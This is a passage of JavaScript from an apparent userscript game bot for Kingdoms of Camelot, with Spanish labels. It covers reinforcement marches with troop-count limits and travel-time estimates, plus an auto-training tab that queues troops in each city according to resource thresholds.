      		var othertroops = (parseInt(document.getElementById('pitargetSupplyTroops').value) + parseInt(document.getElementById('pitargetMilitiaman').value) + parseInt(document.getElementById('pitargetScout').value) + parseInt(document.getElementById('pitargetPikeman').value) + parseInt(document.getElementById('pitargetSwordsman').value) + parseInt(document.getElementById('pitargetArcher').value) + parseInt(document.getElementById('pitargetCavalry').value) + parseInt(document.getElementById('pitargetHeavyCavalry').value) + parseInt(document.getElementById('pitargetSupplyWagon').value) + parseInt(document.getElementById('pitargetBallista').value) + parseInt(document.getElementById('pitargetBatteringRam').value) + parseInt(document.getElementById('pitargetCatapult').value));
          if ( othertroops >= (t.rallypointlevel * 10000) ) {
             document.getElementById('pitargetSupplyTroops').value =0;
             document.getElementById('pitargetMilitiaman').value =0;
             document.getElementById('pitargetScout').value =0;
             document.getElementById('pitargetPikeman').value =0;
             document.getElementById('pitargetSwordsman').value =0;
             document.getElementById('pitargetArcher').value =0;
             document.getElementById('pitargetCavalry').value =0;
             document.getElementById('pitargetHeavyCavalry').value =0;
             document.getElementById('pitargetSupplyWagon').value =0;
             document.getElementById('pitargetBallista').value =0;
             document.getElementById('pitargetBatteringRam').value =0;
             document.getElementById('pitargetCatapult').value =0;
          }
          if (document.getElementById('pitargetBatteringRam').value == 0) t.maxsend = t.maxsend - othertroops;
          if (t.maxsend ==0) t.maxsend = (t.rallypointlevel * 10000);
          if (parseInt(Seed.units['city' + t.from.city.id]['unt'+11]) < t.maxsend) t.maxsend = parseInt(Seed.units['city' + t.from.city.id]['unt'+11]);
      		document.getElementById('pitargetBatteringRam').value = t.maxsend;
      		t.SetETAType();
      		t.ETA(t.dist);
      		document.getElementById('pbETA').innerHTML = (t.ETAstr);
 	  }, false);

 	  document.getElementById('MaxCatapult').addEventListener('click', function(){
 	  		t.maxsend = (t.rallypointlevel * 10000);
      		var othertroops = (parseInt(document.getElementById('pitargetSupplyTroops').value) + parseInt(document.getElementById('pitargetMilitiaman').value) + parseInt(document.getElementById('pitargetScout').value) + parseInt(document.getElementById('pitargetPikeman').value) + parseInt(document.getElementById('pitargetSwordsman').value) + parseInt(document.getElementById('pitargetArcher').value) + parseInt(document.getElementById('pitargetCavalry').value) + parseInt(document.getElementById('pitargetHeavyCavalry').value) + parseInt(document.getElementById('pitargetSupplyWagon').value) + parseInt(document.getElementById('pitargetBallista').value) + parseInt(document.getElementById('pitargetBatteringRam').value) + parseInt(document.getElementById('pitargetCatapult').value));
          if ( othertroops >= (t.rallypointlevel * 10000) ) {
             document.getElementById('pitargetSupplyTroops').value =0;
             document.getElementById('pitargetMilitiaman').value =0;
             document.getElementById('pitargetScout').value =0;
             document.getElementById('pitargetPikeman').value =0;
             document.getElementById('pitargetSwordsman').value =0;
             document.getElementById('pitargetArcher').value =0;
             document.getElementById('pitargetCavalry').value =0;
             document.getElementById('pitargetHeavyCavalry').value =0;
             document.getElementById('pitargetSupplyWagon').value =0;
             document.getElementById('pitargetBallista').value =0;
             document.getElementById('pitargetBatteringRam').value =0;
             document.getElementById('pitargetCatapult').value =0;
          }
          if (document.getElementById('pitargetCatapult').value == 0) t.maxsend = t.maxsend - othertroops;
          if (t.maxsend ==0) t.maxsend = (t.rallypointlevel * 10000);
          if (parseInt(Seed.units['city' + t.from.city.id]['unt'+12]) < t.maxsend) t.maxsend = parseInt(Seed.units['city' + t.from.city.id]['unt'+12]);
      		document.getElementById('pitargetCatapult').value = t.maxsend;
      		t.SetETAType();
      		t.ETA(t.dist);
      		document.getElementById('pbETA').innerHTML = (t.ETAstr);
 	  }, false);

      document.getElementById('pitargetSupplyTroops').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('pitargetSupplyTroops').value)) document.getElementById('pitargetSupplyTroops').value=0 ;
          t.SetETAType();
          document.getElementById('pbETA').innerHTML = (t.ETAstr);
      }, false);
      document.getElementById('pitargetMilitiaman').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('pitargetMilitiaman').value)) document.getElementById('pitargetMilitiaman').value=0 ;
          t.SetETAType();
          document.getElementById('pbETA').innerHTML = (t.ETAstr);
      }, false);
      document.getElementById('pitargetScout').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('pitargetScout').value)) document.getElementById('pitargetScout').value=0 ;
          t.SetETAType();
          document.getElementById('pbETA').innerHTML = (t.ETAstr);
      }, false);
      document.getElementById('pitargetPikeman').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('pitargetPikeman').value)) document.getElementById('pitargetPikeman').value=0 ;
          t.SetETAType();
          document.getElementById('pbETA').innerHTML = (t.ETAstr);
      }, false);
      document.getElementById('pitargetSwordsman').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('pitargetSwordsman').value)) document.getElementById('pitargetSwordsman').value=0 ;
         t.SetETAType();
          document.getElementById('pbETA').innerHTML = (t.ETAstr);
      }, false);
      document.getElementById('pitargetArcher').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('pitargetArcher').value)) document.getElementById('pitargetArcher').value=0 ;
         t.SetETAType();
          document.getElementById('pbETA').innerHTML = (t.ETAstr);
      }, false);
      document.getElementById('pitargetCavalry').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('pitargetCavalry').value)) document.getElementById('pitargetCavalry').value=0 ;
         t.SetETAType();
          document.getElementById('pbETA').innerHTML = (t.ETAstr);
      }, false);
      document.getElementById('pitargetHeavyCavalry').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('pitargetHeavyCavalry').value)) document.getElementById('pitargetHeavyCavalry').value=0 ;
         t.SetETAType();
          document.getElementById('pbETA').innerHTML = (t.ETAstr);
      }, false);
      document.getElementById('pitargetSupplyWagon').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('pitargetSupplyWagon').value)) document.getElementById('pitargetSupplyWagon').value=0 ;
         t.SetETAType();
          document.getElementById('pbETA').innerHTML = (t.ETAstr);
      }, false);
      document.getElementById('pitargetBallista').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('pitargetBallista').value)) document.getElementById('pitargetBallista').value=0 ;
         t.SetETAType();
          document.getElementById('pbETA').innerHTML = (t.ETAstr);
      }, false);
     document.getElementById('pitargetBatteringRam').addEventListener('keyup', function(){
         if (isNaN(document.getElementById('pitargetBatteringRam').value)) document.getElementById('pitargetBatteringRam').value=0 ;
        t.SetETAType();
         document.getElementById('pbETA').innerHTML = (t.ETAstr);
     }, false);
     document.getElementById('pitargetCatapult').addEventListener('keyup', function(){
         if (isNaN(document.getElementById('pitargetCatapult').value)) document.getElementById('pitargetCatapult').value=0 ;
        	t.SetETAType();
         document.getElementById('pbETA').innerHTML = (t.ETAstr);
     }, false);


      window.addEventListener('unload', t.onUnload, false);
    },

    ClickCitySelect: function(city){
    		var t = Tabs.Reinforce;
    		t.getKnights();
    		t.clearbox();
    		t.dist = distance (city.x, city.y, document.getElementById('pfToX').value, document.getElementById('pfToY').value);
    		document.getElementById('pbdistance').innerHTML = ('Distance: '+t.dist);
    		t.SetETAType();
    		t.ETA(t.dist);
    		for (var i=1;i<=12;i++) document.getElementById('unt'+i).innerHTML = addCommas(Seed.units['city'+city.id]['unt'+i])
    		document.getElementById('pbETA').innerHTML = (t.ETAstr);
    },

    getKnights : function(){
       var t = Tabs.Reinforce;
       var knt = new Array();
       t.getRallypoint('city' +t.from.city.id);
       for (k in Seed.knights['city' + t.from.city.id]){
       		if (Seed.knights['city' + t.from.city.id][k]["knightStatus"] == 1 && Seed.leaders['city' + t.from.city.id]["resourcefulnessKnightId"] != Seed.knights['city' + t.from.city.id][k]["knightId"] && Seed.leaders['city' + t.from.city.id]["politicsKnightId"] != Seed.knights['city' + t.from.city.id][k]["knightId"] && Seed.leaders['city' + t.from.city.id]["combatKnightId"] != Seed.knights['city' + t.from.city.id][k]["knightId"] && Seed.leaders['city' + t.from.city.id]["intelligenceKnightId"] != Seed.knights['city' + t.from.city.id][k]["knightId"]){
       			knt.push ({
       				Name:   Seed.knights['city' + t.from.city.id][k]["knightName"],
       				Combat:	parseInt(Seed.knights['city' + t.from.city.id][k]["combat"]),
       				ID:		Seed.knights['city' + t.from.city.id][k]["knightId"],
       			});
       		}
       }
       knt = knt.sort(function sort(a,b) {a = a['Combat'];b = b['Combat'];return a == b ? 0 : (a > b ? -1 : 1);});
       document.getElementById('piKnight').options.length=0;
		var o = document.createElement("option");
		o.text = '--Cambiar un Caballero--';
		o.value = 0;
		document.getElementById("piKnight").options.add(o);
	   for (k in knt){
    			if (knt[k]["Name"] !=undefined){
	    			var o = document.createElement("option");
	    			o.text = (knt[k]["Name"] + ' (' + knt[k]["Combat"] +')')
	    			o.value = knt[k]["ID"];
	    			document.getElementById("piKnight").options.add(o);
    			}
    	}
    },


    SetETAType :function(){
    	var t = Tabs.Reinforce;
    	if (document.getElementById('pitargetSupplyTroops').value == 0 ) t.checkETA=null;
    	if (document.getElementById('pitargetMilitiaman').value == 0 ) t.checkETA=null;
    	if (document.getElementById('pitargetScout').value == 0 ) t.checkETA=null;
    	if (document.getElementById('pitargetPikeman').value == 0 ) t.checkETA=null;
    	if (document.getElementById('pitargetSwordsman').value == 0 ) t.checkETA=null;
    	if (document.getElementById('pitargetArcher').value == 0 ) t.checkETA=null;
    	if (document.getElementById('pitargetCavalry').value == 0 ) t.checkETA=null;
    	if (document.getElementById('pitargetHeavyCavalry').value == 0 ) t.checkETA=null;
    	if (document.getElementById('pitargetSupplyWagon').value == 0 )t.checkETA=null;
    	if (document.getElementById('pitargetBallista').value == 0 ) t.checkETA=null;
    	if (document.getElementById('pitargetBatteringRam').value == 0 ) t.checkETA=null;
    	if (document.getElementById('pitargetCatapult').value == 0 ) t.checkETA=null;
    	if (t.checkETA==null) t.ETAType=null;
    	t.ETA(t.dist);
    	if (document.getElementById('pitargetSupplyTroops').value >0 ) {t.ETAType="0,180";t.ETA(t.dist);}
    	if (document.getElementById('pitargetMilitiaman').value >0 ) {t.ETAType="0,200";t.ETA(t.dist);}
    	if (document.getElementById('pitargetScout').value >0 ) {t.ETAType="0,3000";t.ETA(t.dist);}
    	if (document.getElementById('pitargetPikeman').value >0 ) {t.ETAType="0,300";t.ETA(t.dist);}
    	if (document.getElementById('pitargetSwordsman').value >0 ) {t.ETAType="0,275";t.ETA(t.dist);}
    	if (document.getElementById('pitargetArcher').value >0 ) {t.ETAType="0,250";t.ETA(t.dist);}
    	if (document.getElementById('pitargetCavalry').value >0 ) {t.ETAType="1,1000";t.ETA(t.dist);}
    	if (document.getElementById('pitargetHeavyCavalry').value >0 ) {t.ETAType="1,750";t.ETA(t.dist);}
    	if (document.getElementById('pitargetSupplyWagon').value >0 ) {t.ETAType="1,150";t.ETA(t.dist);}
    	if (document.getElementById('pitargetBallista').value >0 ) {t.ETAType="1,100";t.ETA(t.dist);}
    	if (document.getElementById('pitargetBatteringRam').value >0 ) {t.ETAType="1,120";t.ETA(t.dist);}
    	if (document.getElementById('pitargetCatapult').value >0 ) {t.ETAType="1,80";t.ETA(t.dist);}
    },


    getRallypoint: function(cityId){
      var t = Tabs.Reinforce;
      for (var o in Seed.buildings[cityId]){
		var buildingType = parseInt(Seed.buildings[cityId][o][0]);
		var buildingLevel = parseInt(Seed.buildings[cityId][o][1]);
		if (buildingType == 12) t.rallypointlevel=parseInt(buildingLevel);
	   }
     if(t.rallypointlevel == 11) t.rallypointlevel = 15;
     t.maxsend = (t.rallypointlevel * 10000);
 },

 clearbox: function(){
      var t = Tabs.Reinforce;
      document.getElementById('pitargetSupplyTroops').value = 0;
      if (parseInt(Seed.units['city' + t.from.city.id]['unt'+1]) == 0) document.getElementById('pitargetSupplyTroops').disabled = true;
      else document.getElementById('pitargetSupplyTroops').disabled = false;
      document.getElementById('pitargetMilitiaman').value = 0;
      if (parseInt(Seed.units['city' + t.from.city.id]['unt'+2]) == 0) document.getElementById('pitargetMilitiaman').disabled = true;
      else document.getElementById('pitargetMilitiaman').disabled = false;
      document.getElementById('pitargetScout').value = 0;
      if (parseInt(Seed.units['city' + t.from.city.id]['unt'+3]) == 0) document.getElementById('pitargetScout').disabled = true;
      else document.getElementById('pitargetScout').disabled = false;
      document.getElementById('pitargetPikeman').value = 0;
      if (parseInt(Seed.units['city' + t.from.city.id]['unt'+4]) == 0) document.getElementById('pitargetPikeman').disabled = true;
      else document.getElementById('pitargetPikeman').disabled = false;
      document.getElementById('pitargetSwordsman').value = 0;
      if (parseInt(Seed.units['city' + t.from.city.id]['unt'+5]) == 0) document.getElementById('pitargetSwordsman').disabled = true;
      else document.getElementById('pitargetSwordsman').disabled = false;
      document.getElementById('pitargetArcher').value = 0;
      if (parseInt(Seed.units['city' + t.from.city.id]['unt'+6]) == 0) document.getElementById('pitargetArcher').disabled = true;
      else document.getElementById('pitargetArcher').disabled = false;
      document.getElementById('pitargetCavalry').value = 0;
      if (parseInt(Seed.units['city' + t.from.city.id]['unt'+7]) == 0) document.getElementById('pitargetCavalry').disabled = true;
      else document.getElementById('pitargetCavalry').disabled = false;
      document.getElementById('pitargetHeavyCavalry').value = 0;
      if (parseInt(Seed.units['city' + t.from.city.id]['unt'+8]) == 0) document.getElementById('pitargetHeavyCavalry').disabled = true;
      else document.getElementById('pitargetHeavyCavalry').disabled = false;
      document.getElementById('pitargetSupplyWagon').value = 0;
      if (parseInt(Seed.units['city' + t.from.city.id]['unt'+9]) == 0) document.getElementById('pitargetSupplyWagon').disabled = true;
      else document.getElementById('pitargetSupplyWagon').disabled = false;
      document.getElementById('pitargetBallista').value = 0;
      if (parseInt(Seed.units['city' + t.from.city.id]['unt'+10]) == 0) document.getElementById('pitargetBallista').disabled = true;
      else document.getElementById('pitargetBallista').disabled = false;
      document.getElementById('pitargetBatteringRam').value = 0;
      if (parseInt(Seed.units['city' + t.from.city.id]['unt'+11]) == 0) document.getElementById('pitargetBatteringRam').disabled = true;
      else document.getElementById('pitargetBatteringRam').disabled = false;
      document.getElementById('pitargetCatapult').value = 0;
      if (parseInt(Seed.units['city' + t.from.city.id]['unt'+12]) == 0) document.getElementById('pitargetCatapult').disabled = true;
      else document.getElementById('pitargetCatapult').disabled = false;

 },

  ETA : function(dist) { // Need Relief Station Levels to estimate transport, reinf, or reassign times.
   var t = Tabs.Reinforce;
   t.cityID = t.from.city.id;
   if (dist == 0) {t.ETAstr = "Tiempo Refuerzo: Distancia 0";return;}
   if (t.ETAType == null) {t.ETAstr = "Tiempo Refuerzo: NO hay tropas seleccionadas";return;}
   var baseSpeedSel = t.ETAType;
   var m = baseSpeedSel.split(',');
   var horse = parseInt(m[0]);
   var baseSpeed = parseInt(m[1]);
   if (baseSpeed == 0) {t.ETAstr = "Tiempo: Desconocido";return;}
   var mmLvl = parseInt(Seed.tech.tch11);//Magical Mapping
   var Speed = 0;
   if (horse){
   //HorsesSiegeSpeed = Base * (1 + MM/10) * (1 + AH/20)
     var hsLvl = parseInt(Seed.tech.tch12);//Alloy Horse Shoes
     Speed = baseSpeed * (1 + mmLvl/10) * (1 + hsLvl/20);
   }
   else {
   //FootSpeed = Base * (1 + MM/10)
     Speed = baseSpeed * (1 + mmLvl/10);
   }
   //Grid Speed (tiles/second) = Speed (100ths/min) / 6000
   var gSpeed = 0;
   var estSec = 0;
   if (Speed>0) {
     gSpeed = Speed/6000;
     estSec = (dist/gSpeed).toFixed(0);
   }
   //RS - Cities Relief Station Level
   //Friendly Speed = Speed * (1 + RS/2)
    var building = getCityBuilding (t.cityID, 18);
    fSpeed = Speed * (1 + parseInt(building.maxLevel)/2);
       gSpeed = fSpeed/6000;
       estSec = (dist/gSpeed).toFixed(0);
       if (t.checkETA == null || t.checkETA < (parseInt((estSec+''))+30)){
       		 t.ETAstr = 'Tiempo Refuerzo: ' + timestr ((parseInt((estSec+''))+30));
       		 t.checkETA = (parseInt((estSec+''))+30);
       }
 },


    doReinforce: function(){
    	var t = Tabs.Reinforce;
   		var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
		params.r1 = 0;
		params.u1 = 0;
		params.u2 = 0;
		params.u3 = 0;
		params.u4 = 0;
		params.u5 = 0;
		params.u6 = 0;
		params.u7 = 0;
		params.u8 = 0;
		params.u9 = 0;
		params.u10 = 0;
		params.u11 = 0;
		params.u12 = 0;

  		params.cid= t.from.city.id;
		params.type = "2";
		params.kid= document.getElementById("piKnight").value;
		params.xcoord = document.getElementById('pfToX').value;
		params.ycoord = document.getElementById('pfToY').value;
		params.u1 = document.getElementById('pitargetSupplyTroops').value;
		params.u2 = document.getElementById('pitargetMilitiaman').value;
		params.u3 = document.getElementById('pitargetScout').value;
		params.u4 = document.getElementById('pitargetPikeman').value;
		params.u5 = document.getElementById('pitargetSwordsman').value;
		params.u6 = document.getElementById('pitargetArcher').value;
		params.u7 = document.getElementById('pitargetCavalry').value;
		params.u8 = document.getElementById('pitargetHeavyCavalry').value;
		params.u9 = document.getElementById('pitargetSupplyWagon').value;
		params.u10 = document.getElementById('pitargetBallista').value;
		params.u11 = document.getElementById('pitargetBatteringRam').value;
		params.u12 = document.getElementById('pitargetCatapult').value;
		params.food = document.getElementById('pisendfood').value;

      	new AjaxRequest(unsafeWindow.g_ajaxpath + "ajax/march.php" + unsafeWindow.g_ajaxsuffix, {
                  method: "post",
                  parameters: params,
                  loading: true,
                  onSuccess: function (transport) {
                  var rslt = eval("(" + transport.responseText + ")");
                  if (rslt.ok) {
                  var timediff = parseInt(rslt.eta) - parseInt(rslt.initTS);
                  var ut = unsafeWindow.unixtime();
                  var unitsarr=[0,0,0,0,0,0,0,0,0,0,0,0,0];
                  for(i = 0; i <= unitsarr.length; i++){
                  	if(params["u"+i]){
                  	unitsarr[i] = params["u"+i];
                  	}
                  }
                  var resources=new Array();
                  resources[0] = params.gold;
                  for(i=1; i<=4; i++){
                  	resources[i] = params["r"+i];
                  }
                  var currentcityid = params.cid;
                  unsafeWindow.attach_addoutgoingmarch(rslt.marchId, rslt.marchUnixTime, ut + timediff, params.xcoord, params.ycoord, unitsarr, params.type, params.kid, resources, rslt.tileId, rslt.tileType, rslt.tileLevel, currentcityid, true);
                  if(rslt.updateSeed){unsafeWindow.update_seed(rslt.updateSeed)};
                  t.getKnights();
                  t.clearbox();
				  document.getElementById('pbReinfMain').style.background ='#99FF99';
					setTimeout(function(){ (document.getElementById('pbReinfMain').style.background =''); }, 1000);
                  } else {
                  document.getElementById('pbReinfMain').style.background ='#FF0000';
					setTimeout(function(){ (document.getElementById('pbReinfMain').style.background =''); }, 1000);
				  //actionLog('FAIL :' + cityname + ' - ' + rslt.error_code + ' -  ' + rslt.msg + ' -  ' + rslt.feedback);
                  //unsafeWindow.Modal.showAlert(printLocalError((rslt.error_code || null), (rslt.msg || null), (rslt.feedback || null)))
                  }
                  },
                  onFailure: function () {}
          });

	},


	show: function(){
		var t = Tabs.Reinforce;
    },
	hide: function(){
        var t = Tabs.Reinforce;
    },
    onUnload: function(){
    },
}


/************************  AutoTrain Tab ************************/
Tabs.AutoTrain = {
  tabOrder: 120,
  tabLabel: 'AutoEntrenamiento',
  myDiv: null,
  city:0,
  
  init: function(div){
	var t = Tabs.AutoTrain;
    t.myDiv = div;
    t.myDiv.style.overflowY = 'auto';
	t.city = 0;
	t.nextcity();
	
    var m = '<DIV class=pbStat>AUTO ENTRENAMIENTO</div><TABLE width=100% height=0% class=pbTab><TR><TD width=200></td>';
        m += '<TD align=center><INPUT id=pbAutoTrainState type=submit value="AutoEntrenar = '+ (TrainOptions.Running?'ON':'OFF')+'"></td>';
        m += '<TD align=right><INPUT id=pbShowTrainHelp type=submit value="Ayuda"></td>';
        m += '</tr></table></div>';
        m += '<DIV class=pbStat>OPCIONES DE ENTRENAMIENTO</div><TABLE width=100% height=0% class=pbTab><TR align="center">';

    for (i=0;i<Seed.cities.length;i++){
		city = i+1;
      	m += '<TABLE id=pbTrain width=100% height=0% class=pbTab><TR align="left">';
      	m+='<TR><TD width=30px><INPUT type=checkbox class='+city+' id="SelectCity'+city+'"></td><TD width = 100px><B>'+ Seed.cities[i][1] +'</b></td>';
	    m += '<TD width=150px><SELECT class='+city+' id="TroopsCity'+city+'"><option value="Select">--Select--</options>';
	    for (y in unsafeWindow.unitcost) m+='<option value="'+y.substr(3)+'">'+unsafeWindow.unitcost[y][0]+'</option>';
	    m+='</select></td>';
	    m +='<TD width=100px>Min.: <INPUT class='+city+' id=treshold'+city+' type=text size=4 maxlength=6 value="'+ TrainOptions.Threshold[city]+'"\></td>';
	    m +='<TD width=130px><INPUT type=checkbox class='+city+' id="SelectMax'+city+'"> Max.: <INPUT class='+city+' id=max'+city+' type=text size=5 maxlength=6 value="'+ TrainOptions.Max[city]+'"\></td>';
	    m +='<TD>Usar Trabajadores: ';
        m+='<SELECT class='+city+' id="workers'+city+'"><option value="0">0%</options>';
        m+='<option value="25">25%</options>';
        m+='<option value="50">50%</options>';
        m+='<option value="75">75%</options>';
        m+='<option value="100">100%</options>';
        m+='</td></tr></table>';
	    m += '<TABLE id=pbTrain width=80% height=0% class=pbTab><TR align="left">';
        m += '<TD width=40px></td><TD width=5%><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/food_30.png"></td>';
	    m += '<TD><INPUT class='+city+' id="KeepFood'+city+'" type=text size=7 maxlength=7 value="'+ TrainOptions.Keep[city]['Food']+'"\></td>';
	    m += '<TD width=20px><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/wood_30.png"></td>';
	    m += '<TD><INPUT class='+city+' id="KeepWood'+city+'" type=text size=7 maxlength=7 value="'+ TrainOptions.Keep[city]['Wood']+'"\></td>';
	    m += '<TD width=20px><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/stone_30.png"></td>';
	    m += '<TD><INPUT class='+city+' id="KeepStone'+city+'" type=text size=7 maxlength=7 value="'+ TrainOptions.Keep[city]['Stone']+'"\></td>';
	    m += '<TD width=20px><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/iron_30.png"></td>';
	    m += '<TD><INPUT class='+city+' id="KeepOre'+city+'" type=text size=7 maxlength=7 value="'+ TrainOptions.Keep[city]['Ore']+'"\></td>';
	      
	    m += '<TD><SELECT class='+city+' id="Resource'+city+'"><option value="true">Mantener</options>';
	    m+='<option value="false">Usar</option>';
	    m+='</select></td></tr>';	    
	         
	}
	    m+='</table>';
      
		t.myDiv.innerHTML = m;
      
    for (i=0;i<Seed.cities.length;i++){
        city = i+1;
        document.getElementById('TroopsCity'+city).value = TrainOptions.Troops[city];
        document.getElementById('SelectCity'+city).checked = TrainOptions.Enabled[city];
        document.getElementById('Resource'+city).value = TrainOptions.Resource[city];
        document.getElementById('SelectMax'+city).checked = TrainOptions.SelectMax[city];
        document.getElementById('workers'+city).value = TrainOptions.Workers[city];
        if (!TrainOptions.SelectMax[city]) document.getElementById('max'+city).disabled=true;
    }
       
    document.getElementById('pbShowTrainHelp').addEventListener('click', function(){
		t.helpPop(this);
    }, false);
       
    document.getElementById('pbAutoTrainState').addEventListener('click', function(){
		t.toggleAutoTrainState(this);
    }, false);

	for(var k=1; k<=Seed.cities.length; k++){
     	document.getElementById('treshold'+k).addEventListener('change', function(e){
     	    if (isNaN(e.target.value)) e.target.value=0 ;
			TrainOptions.Threshold[e.target['className']] = e.target.value;
     		saveTrainOptions();
     	}, false);
     	document.getElementById('SelectMax'+k).addEventListener('change', function(e){
 		    TrainOptions.SelectMax[e.target['className']] = e.target.checked;
 		    if (!TrainOptions.SelectMax[e.target['className']]){
				document.getElementById('max'+e.target['className']).value = 0;
				document.getElementById('max'+e.target['className']).disabled=true;
			} else {
				document.getElementById('max'+e.target['className']).disabled=false;
			}
			saveTrainOptions();
 	    }, false);
 		document.getElementById('max'+k).addEventListener('change', function(e){
      	    TrainOptions.Max[e.target['className']] = e.target.value;
      	    saveTrainOptions();
      	}, false);
     		document.getElementById('workers'+k).addEventListener('change', function(e){
      	    TrainOptions.Workers[e.target['className']] = e.target.value;
      	    saveTrainOptions();
      	}, false);
     	document.getElementById('Resource'+k).addEventListener('change', function(e){
			TrainOptions.Resource[e.target['className']] = e.target.value;
     		saveTrainOptions();
		}, false);
        document.getElementById('SelectCity'+k).addEventListener('change', function(e){
            TrainOptions.Enabled[e.target['className']] = e.target.checked;
			saveTrainOptions();
      	}, false);
      	document.getElementById('TroopsCity'+k).addEventListener('change', function(e){
			TrainOptions.Troops[e.target['className']] = e.target.value;
            saveTrainOptions();
      	}, false);
      	document.getElementById('KeepFood'+k).addEventListener('change', function(e){
			if (isNaN(e.target.value)) e.target.value=0 ;
            TrainOptions.Keep[e.target['className']]['Food'] = e.target.value;
            saveTrainOptions();
      	}, false);
      	document.getElementById('KeepWood'+k).addEventListener('change', function(e){
      	    if (isNaN(e.target.value)) e.target.value=0 ;
            TrainOptions.Keep[e.target['className']]['Wood'] = e.target.value;
            saveTrainOptions();
      	}, false);
      	document.getElementById('KeepStone'+k).addEventListener('change', function(e){
			if (isNaN(e.target.value)) e.target.value=0 ;
            TrainOptions.Keep[e.target['className']]['Stone'] = e.target.value;
            saveTrainOptions();
      	}, false);
      	document.getElementById('KeepOre'+k).addEventListener('change', function(e){
      	    if (isNaN(e.target.value)) e.target.value=0 ;
            TrainOptions.Keep[e.target['className']]['Ore'] = e.target.value;
            saveTrainOptions();
      	}, false);
    } 
  },
  
  
  helpPop : function (){
    var helpText = '<BR><DL><dt>Auto entrenamiento:<dd><LI>Active la casilla de delante de la fila para que auto entrene en esa ciudad (el número es el número de la ciudad).</dd>\
    	<dd><LI>Seleccione un tipo de tropa pora la ciudad en los cuadros desplegables.</dd>\
        <dd><LI>Especifique las tropas mínimas que desencadena el auto entrenamiento (no se formarán menos de esto).</dd>\
        <dt>Rellene los recursos:</dt>\
          <dd><LI>Mantener: Auto entrenar mantendrá esta cantidad minima disponible en la ciudad.</dd>\
          <dd><LI>Uso: Auto entrenar sólo utilizará los recursos para entrenar a las tropas.</dd>\
        <dt>A su vez está en: </dt>\
          <dd><LI>Pulse el botón de activación Auto Entrenar.</dd></ul>';
    var pop = new CPopup ('giftHelp', 0, 0, 550, 250, true);
    pop.centerMe (mainPop.getMainDiv());
    pop.getMainDiv().innerHTML = helpText;
    pop.getTopDiv().innerHTML = '<CENTER><B>Ayuda Power Bot</b>:  Auto Entrenamiento</center>';
    pop.show (true);
  },
  
  toggleAutoTrainState: function(obj){
	var t = Tabs.AutoTrain;
    if (TrainOptions.Running == true) {
        TrainOptions.Running = false;
        obj.value = "AutoTrain = OFF";
    }
    else {
        TrainOptions.Running = true;
        obj.value = "AutoTrain = ON";
		t.nextcity();
    }
    saveTrainOptions();
  },
    
  show: function(){
	var t = Tabs.AutoTrain;
  },
  hide: function(){
    var t = Tabs.AutoTrain;
  },
  
  checkidlepopulation : function(cityId){
	var t = Tabs.AutoTrain;
	if(TrainOptions.Workers[t.city] == 0)
		t.idle = parseInt(Seed.citystats['city'+cityId].pop[0]) - parseInt(Seed.citystats['city'+cityId].pop[3]);
	else
		t.idle = ((TrainOptions.Workers[t.city]/100)*parseInt(Seed.citystats['city'+cityId].pop[0])).toFixed(0);
	return t.idle>0?true:false;
  },
  checktrainslots : function(cityId){
	var t = Tabs.AutoTrain;
	t.barracks = getCityBuilding(cityId, 13).count;
	t.slots = Seed.queue_unt['city'+cityId].length;
	t.empty = parseInt(t.barracks - t.slots);
	return t.empty>0?true:false;
  },
  checkresources : function(cityId){
	var t = Tabs.AutoTrain;
	t.food = parseInt((Seed.resources['city'+cityId].rec1[0]/3600) - TrainOptions['Keep'][t.city]['Food']);
	t.wood = parseInt((Seed.resources['city'+cityId].rec2[0]/3600) - TrainOptions['Keep'][t.city]['Wood']);
	t.stone = parseInt((Seed.resources['city'+cityId].rec3[0]/3600) - TrainOptions['Keep'][t.city]['Stone']);
	t.ore = parseInt((Seed.resources['city'+cityId].rec4[0]/3600) - TrainOptions['Keep'][t.city]['Ore']);
	if(t.food>0 && t.wood>0 && t.stone>0 && t.ore>0){
		return true;
	}
	return false;
  },
  trainamt : function(cityId, unitId){
	var t = Tabs.AutoTrain;
	if(!unitId || unitId<1) return false;
	var cost = unsafeWindow.unitcost['unt'+ unitId];
	t.amt = (t.idle/cost[6]).toFixed(0);
	if ((t.food/cost[1]) < t.amt) t.amt = (t.food/cost[1]).toFixed(0);
	if ((t.wood/cost[2]) < t.amt) t.amt = (t.wood/cost[2]).toFixed(0);
	if ((t.stone/cost[3]) < t.amt) t.amt = (t.stone/cost[3]).toFixed(0);
	if ((t.ore/cost[4]) < t.amt) t.amt = (t.ore/cost[4]).toFixed(0);
	if(TrainOptions.SelectMax[t.city]){
		if(parseInt(t.amt) > parseInt(TrainOptions.Max[t.city])) t.amt = TrainOptions.Max[t.city];
	}
	if(parseInt(t.amt) < parseInt(TrainOptions.Threshold[t.city])) t.amt = 0;
	return t.amt>0?true:false;
  },
  nextcity : function(){
	var t = Tabs.AutoTrain;
	if (!TrainOptions.Running) return;
	t.city++;
	if(t.city > Seed.cities.length) t.city = 1;
	var cityId = Seed.cities[t.city-1][0];
	var idle = t.checkidlepopulation(cityId);
	var trainslots = t.checktrainslots(cityId);
	var resources = t.checkresources(cityId);
	var train = t.trainamt(cityId, TrainOptions['Troops'][t.city]);
	if(!TrainOptions.Enabled[t.city] || TrainOptions['Troops'][t.city]==0 || !idle || !trainslots || !resources || !train){
		setTimeout(t.nextcity, 5000);
		return;
	}
	t.doTrain(cityId, TrainOptions['Troops'][t.city], t.amt, t.nextcity);
  },
  doTrain : function (cityId, unitId, num, notify){
	var time = unsafeWindow.modal_barracks_traintime(unitId, num);
	var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
	params.cid = cityId;
	params.type = unitId;
	params.quant = num;

	new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/train.php" + unsafeWindow.g_ajaxsuffix, {
		method: "post",
